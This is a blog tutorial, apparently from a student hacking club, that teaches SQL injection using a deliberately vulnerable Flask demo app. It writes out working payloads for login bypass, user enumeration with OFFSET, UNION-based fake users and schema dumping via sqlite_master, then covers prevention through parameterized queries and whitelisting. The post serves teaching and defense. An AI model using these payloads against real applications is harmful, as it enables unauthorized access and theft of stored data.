---
layout: post
title: "SQL Injection Tutorial"
date: 2016-04-15
---

### What is SQL?

SQL stands for **S**tructrued **Q**uery **L**anguage.

Some properties of SQL are:

1. Tabular Database
2. Organized Layout (schema)

There are many different flavors of SQL, such as:

1. PostreSQL
2. MSSQL
3. MySQL
4. MariaDB
5. SQLite
6. ... and many, many more

Lots and lots of large products use SQL:

1. Android
2. iOS
3. Mozilla Firefox
4. Oracle
5. Microsoft
6. A lot... of websites...

### How do you use SQL?

As a demonstration, we can use Python's SQLite3 library as a quick demonstration:

<div class="codeblock">
<code>
&gt;&gt;&gt; import sqlite3
<br>
&gt;&gt;&gt; conn = sqlite3.connect("mydb.db")
<br>
&gt;&gt;&gt; c = conn.cursor()
<br>
&gt;&gt;&gt; c.execute("CREATE TABLE table1(a text, b integer)")
<br>
&lt;sqlite3.Cursor object at 0x10aad31f0&gt;
<br>
&gt;&gt;&gt; c.execute("INSERT INTO table1 VALUES ('yo', 1)")
<br>
&gt;sqlite3.Cursor object at 0x10aad31f0&gt;
<br>
&gt;&gt;&gt; c.execute("SELECT * FROM table1").fetchall()
<br>
[(u'yo', 1)]
<br>
</code>
</div>

The above creates a database called `mydb.db`. Then it creates a `cursor` object
that will "type" out commands to be executed in a `SQLite3`. This is just the
way Python implemented the SQLite library. The string we input into `c.execute`
is an SQLite command.

```
CREATE TABLE table1(a text, b integer)
```

This creates a table in the database called `table1` with the fields `a`, an
integer, and `b`, a text field.

The next command: `INSERT INTO table1 VALUES ('yo', 1)` will insert the row `yo, 1`
into `table1`.

The next command is what we care about in SQL injection:

```
SELECT * FROM table1
```
This is called a query. This particular query returns the entire table.

In an implementation of SQL that uses text replacement, it is very dangerous to
use *literal replacement*. In a literal replacement, it is possible for the
query itself to be modified to do something unintended. Consider the following
code in Python:

```
c.execute(“SELECT * FROM users WHERE uname = '%s'” % (uname)).fetchall()
```

Well what is this query supposed to do? This is a simple query that selects all
the users in the database who have the username that matches what the user
input. ... *But*... What if an evil person doesn't know a username, and wants
this query to return true? Or maybe he just wants all the usernames?

### Our first injection

<div class="codeblock">
<code>
SELECT * FROM users WHERE uname='$uname';
<br>
$uname = “' -- ”;
<br>
SELECT * FROM users WHERE uname='' -- ';
<br>
SELECT * FROM users WHERE uname='';
<br>
</code>
</div>

As you can see, the query becomes "Select all users with a blank username."

What if we try something similar:

<div class="codeblock">
<code>
SELECT * FROM users WHERE uname='$uname';
<br>
$uname = “' OR 1 = 1 -- ”;
<br>
SELECT * FROM users WHERE uname='' OR 1 = 1 -- ';
<br>
SELECT * FROM users WHERE uname='' OR 1 = 1;
<br>
SELECT * FROM users WHERE false OR true;
<br>
SELECT * FROM users WHERE true;
<br>
SELECT * FROM users;
<br>
</code>
</div>

As you can see, the simple query to match up an input username is turned into a
query to return all the rows in the database!

### But we have some limits...

Many login systems will restrict the number of returned rows to exactly 1 in
order to successfully log in, or display info. Clearly, it is bad practice as a
developer to just use:

<div class="codeblock">
<code>
if query.rows == 0:
<br>
    return False # Bad login
<br>
renderData() # Otherwise successful login!
<br>
</code>
</div>

(The above is just pseudo-code, that's not actually how you check the number of
returned rows.) Instead what most programs will mimic is something like this:

<div class="codeblock">
<code>
if query.rows != 1:
<br>
    return False # Bad login
<br>
renderData() # Otherwise successful login!
<br>
</code>
</div>

So how do we bypass this? Our first injection won't work unless there's exactly
one row in the database, and for most databases, that's simply not the case.

**The solution**: We can take advantage of the `LIMIT` keyword in SQL. In SQL,
the `LIMIT` keyword is a lot like the `head` command in Bash: it simply returns
the first `n` rows of a query. For example:

```
SELECT * FROM fruits WHERE type="apple" AND color="green" LIMIT 5;
```

This query selects the first 5 rows in `fruits` where the type of fruit is
"apple" and the color is "green".

We can use this in our injection:

<div class="codeblock">
<code>
SELECT * FROM users WHERE uname='$uname';
<br>
$uname = “' OR 1 = 1 LIMIT 1 -- ”;
<br>
SELECT * FROM users WHERE uname='' OR 1 = 1 LIMIT 1 -- ';
<br>
SELECT * FROM users WHERE uname='' OR 1 = 1 LIMIT 1;
<br>
SELECT * FROM users WHERE false OR true LIMIT 1;
<br>
SELECT * FROM users WHERE true LIMIT 1;
<br>
SELECT * FROM users LIMIT 1;
<br>
</code>
</div>

This will select the *first* row of the database. (**Tip**: Usually the first
row of the database is an admin user or some dummy user that a developer used
during testing and didn't want to / forgot to remove.)

### What else can we do with SQL injection?

1. Grab the passwords of specific users
2. Select and login as a specific user
3. Log in as a “ghost” user
4. Get the names of all the other tables in the database
5. Dump… the database…
6. Drop. The. Base. The Database.

### Demonstrations

I've created a tiny sample Python Flask application that you can use to test SQL
injections, using SQLite3 syntax. The source is located
[here](https://github.com/stuyhack/2015-2016/tree/master/11-18-15_SQLi).

The vulnerable part is in `vulndb.py`. The vulnerablility in this application is
the use of the **format string**. As you can see in the line

```
QUERY = "SELECT * FROM users WHERE uname = '%s'" % (uname)
```

We use the `%s` to input a string. However, because of the way this is passed
into SQLite, what it will do is take our `uname` variable, duplicate it into the
query, and run that query character for character in an SQLite console.

You can run the Python application by doing:

```
$ python app.py 2> /dev/null # Silences the Flask output messages
```

Note that this application will only log you in if there is only 1 row returned.

In our injections, we use the ` -- ` at the end to comment out the rest of the
query. Note the spaces before and after the double dashes. These spaces prevent
some flavors of SQL from crashing, as some implementations of SQL will filter
special characters by checking for space separated strings.

### Specific examples using the demo app

#### Logging in

The query `bob' -- ` will log us in as `bob` ***if*** we knew that `bob` was a
user in the database, and if there was exactly 1 `bob` in the database. However,
in the terminal, if we do:

<div class="codeblock">
<code>
$ sqlite3
&gt; .open users.db
&gt; INSERT INTO users VALUES("bob", "tango");
</code>
</div>

This will add a new user called `bob` into the database, so `bob' -- ` will no
longer work. To undo this, go back into the SQLite3 console and run:

```
> DELETE FROM users WHERE uname="bob" AND pword="tango";
```

The query `' OR 1=1 LIMIT 1 -- ` will log in as the first user.
The query `' OR 1=1 LIMIT 1 OFFSET n -- ` will log in as the nth user.

If we wanted to get all the usernames in the table, we could write a simple
script to request the webpage, inject our SQL query, and increment offset
values.

#### Ghost users

We can also insert a user that **doesn't actually exist** in the database. We
can use the `UNION` keyword in SQL! From the SQL documentation, we see that SQL
can only perform the union operation if the number of columns of the 2 "sets" is
the same.

To find the number of columns, we can use the `ORDER BY` attack. What this
attack uses is the fact that SQL will *crash* if `ORDER BY` cannot be performed.
Let me back up a bit: `ORDER BY n` will sort the rows selected based on the nth
column. Thus, if the column does not exist (such as doing `ORDER BY 9001` in a 5
column table), then SQL will crash.

Using this logic, we can find the number of columns by just incrementing `n`
until it crashes. If it crashes at some arbitrary number `x`, then the number of
columns is x-1.

In the example application, we see that there are only 2 columns: `ORDER BY 3 --
` will crash. To inject a ghost user, do:

```
' UNION SELECT "this is a fake name", "this is a fake password" -- 
```

#### Stealing information

In order to steal information, we need to know the names of the columns. We know
that SQL obeys a certain schema. Lo and behold, the schema is stored within SQL!
In SQLite3, this schema is a table called `sqlite_master`, and in MySQL, it's
called `information_schema`, or rather `information_schema.tables` for the
tables.

If the website displays the username by pulling it from the database, you can
use:

```
' UNION SELECT name, sql FROM sqlite_master LIMIT 1 -- 
```

This injection will get you started on your journeys.

### Automating SQL Injections

To automate tedious injections, you can write custom scripts like the `inject`
scripts in the demo app repository. Or you can use the tool:
[sqlmap](http://sqlmap.org/).

### Preventing SQL injection

There are a few ways to prevent injection. The main way to do this is to stop
the injection at it's root cause: the literal text replacement.

The main way of doing this is to *sanitize your inputs*. This is what the famous
"Bobby Tables" XKCD comic demonstrates. In Python, using `?` instead of `%s`
when using SQLite3 will delimit and *sanitize* the input.

Another way to prevent SQL injection is to *whitelist* the input. It is common
practice to use blacklists, but there are always cases that can loophole around
any blacklist. It is much easier to simply whitelist for things like "only
alphanumeric characters may be used" or limiting the special characters that can
be used.

